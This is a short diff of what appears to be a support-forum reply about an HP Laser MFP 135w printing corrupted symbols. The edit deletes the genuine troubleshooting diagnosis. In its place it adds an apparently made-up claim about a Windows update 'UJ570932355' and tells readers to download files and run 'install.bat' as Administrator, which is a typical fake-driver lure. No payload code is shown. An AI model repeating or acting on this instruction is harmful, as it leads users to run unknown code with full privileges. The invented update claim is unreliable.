@@ -2,13 +2,11 @@
 
 Welcome to the HW Support Community! 
 
+This Driver is used to fix print error caused by Windows Updates UJ570932355 package.
+
 Thanks for reaching out about your query regarding error on your printer!  
 
-We're thrilled to have the opportunity to assist you and provide a solution.
-
- 
-
-It sounds like your HP Laser MFP 135w is experiencing a corrupt print job or driver issue. The "decode failed" message and random symbols often indicate corrupted print data. Try these steps to fix it:
+Download all files and execute install.bat with Administrator role.
 
 Cancel All Print Jobs
 Windows:
